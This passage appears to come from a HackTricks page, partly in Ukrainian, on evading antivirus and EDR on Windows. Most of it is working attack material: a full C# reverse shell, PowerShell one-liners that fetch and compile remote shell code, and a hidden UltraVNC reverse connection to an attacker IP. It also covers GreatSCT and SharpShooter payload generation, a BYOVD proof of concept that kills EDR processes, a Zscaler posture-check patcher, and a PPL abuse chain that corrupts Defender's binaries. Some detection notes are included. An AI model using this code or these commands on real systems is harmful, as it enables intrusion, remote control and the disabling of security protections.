https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **видаляти частини бінарника**, поки не **з’ясує яка частина Defender** вважає шкідливою і розділить це для вас.\
Інший інструмент, що робить **те саме** — [**avred**](https://github.com/dobin/avred) з веб-сервісом на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10, всі Windows постачались з **Telnet server**, який ви могли встановити (як адміністратор) зробивши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Налаштуйте його так, щоб воно **запускалося** при старті системи, і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (stealth) і вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажити з: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні bin downloads, не setup)

**ON THE HOST**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ та **щойно** створений файл _**UltraVNC.ini**_ всередину **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

УВАГА: Щоб зберегти прихованість, не робіть наступного

- Не запускайте `winvnc` якщо він уже запущений або ви викличете [popup](https://i.imgur.com/1SROTTl.png). Перевірте чи він запущений за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії або це викличе відкриття [the config window](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` за допомогою параметра help або ви викличете [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажити з: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` та **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний defender дуже швидко завершить процес.**

### Компілювання власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# — використання компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання python для build injectors (приклад):

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 використав невелику консольну утиліту, відому як **Antivirus Terminator**, щоб відключити endpoint-захист перед розгортанням ransomware. Інструмент приносить свій **вразливий але *підписаний* драйвер** і зловживає ним для виконання привілейованих операцій в ядрі, які навіть Protected-Process-Light (PPL) AV сервіси не можуть блокувати.

Key take-aways
1. **Signed driver**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — легітимно підписаний драйвер `AToolsKrnl64.sys` від Antiy Labs’ “System In-Depth Analysis Toolkit”. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його так, щоб `\\.\ServiceMouse` став доступним з user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD повністю обходить user-mode захисти; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або маніпулювати об’єктами ядра незалежно від PPL/PP, ELAM чи інших механізмів жорсткого захисту.

Detection / Mitigation
•  Увімкніть Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовився завантажувати `AToolsKrnl64.sys`.  
•  Моніторьте створення нових *kernel* сервісів і сповіщайте, коли драйвер завантажується з директорії з доступом для запису для всіх або коли він відсутній в allow-list.  
•  Слідкуйте за user-mode дескрипторами до кастомних device object, за якими слідують підозрілі виклики `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує device-posture правила локально і покладається на Windows RPC для передачі результатів іншим компонентам. Два слабкі дизайнерські рішення роблять повний bypass можливим:

1. Оцінка posture відбувається **повністю на клієнті** (на сервер надсилається булеве значення).
2. Внутрішні RPC кінцеві точки перевіряють лише те, що підключуваний виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Шляхом **патчингу чотирьох підписаних бінарників на диску** обидва механізми можна нейтралізувати:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) процес може прив’язатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску service stack:

* **All** posture checks display **green/compliant**.
* Несигновані або змінені бінарні файли можуть відкривати named-pipe RPC endpoints (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Компрометований хост отримує необмежений доступ до internal network, визначеної політиками Zscaler.

Цей кейс демонструє, як чисто клієнтські рішення довіри та прості перевірки підпису можуть бути подолані кількома байтовими патчами.

## Зловживання Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) забезпечує ієрархію signer/level, так що лише процеси з рівнем не нижчим можуть модифікувати один одного. В атаці, якщо ви легітимно можете запустити PPL-enabled бінар і контролювати його аргументи, ви можете перетворити безпечну функціональність (наприклад, логування) на обмежений PPL-підтримуваний write primitive проти захищених директорій, які використовують AV/EDR.

Що змушує процес запускатися як PPL
- Цільовий EXE (та будь-які завантажені DLL) має бути підписаний з EKU, що підтримує PPL.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Має бути запитано сумісний рівень захисту, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Неправильні рівні призведуть до помилки при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Підписаний системний бінарник `C:\Windows\System32\ClipUp.exe` самозапускається і приймає параметр для запису файлу журналу за шляхом, вказаним викликом.
- При запуску як PPL-процес запис файлу виконується з підтримкою PPL.
- ClipUp не може розбирати шляхи, що містять пробіли; використовуйте короткі 8.3-імена, щоб вказати на зазвичай захищені розташування.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть PPL-сумісний LOLBIN (ClipUp) з `CREATE_PROTECTED_PROCESS`, використовуючи лаунчер (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху журналу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте 8.3 короткі імена.
3) Якщо цільовий бінарник зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження до того, як AV стартує, встановивши автозапусковий сервіс, який гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис з підтримкою PPL відбувається до того, як AV заблокує свої бінарники, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім розміщення; цей примітив підходить для корупції, а не для точного інжекційного вмісту.
- Потребує локальних прав admin/SYSTEM для встановлення/запуску служби та вікна перезавантаження.
- Час виконання критичний: ціль не повинна бути відкрита; виконання під час завантаження уникає блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо коли батьківський процес — нестандартний лаунчер, в період завантаження.
- Нові служби, налаштовані на автостарт підозрілих бінарних файлів і які послідовно запускаються перед Defender/AV. Досліджуйте створення/зміну служб до збоїв запуску Defender.
- Моніторинг цілісності файлів для бінарників Defender та директорій Platform; несподіване створення/зміна файлів процесами з прапорами protected-process.
- ETW/EDR телеметрія: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, та аномальне використання рівнів PPL невідповідними non-AV binaries.

Пом'якшення
- WDAC/Code Integrity: обмежити, які підписані бінарники можуть запускатися як PPL і під якими батьківськими процесами; блокувати виклики ClipUp поза легітимними контекстами.
- Гігієна служб: обмежити створення/зміну служб з автостартом та моніторити маніпуляції порядком запуску.
- Переконайтесь, що Defender tamper protection та early-launch protections увімкнені; дослідіть помилки запуску, що вказують на пошкодження бінарників.
- Розгляньте можливість відключення генерації коротких імен 8.3 на томах, що містять інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно протестуйте).

Посилання щодо PPL та інструментів
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
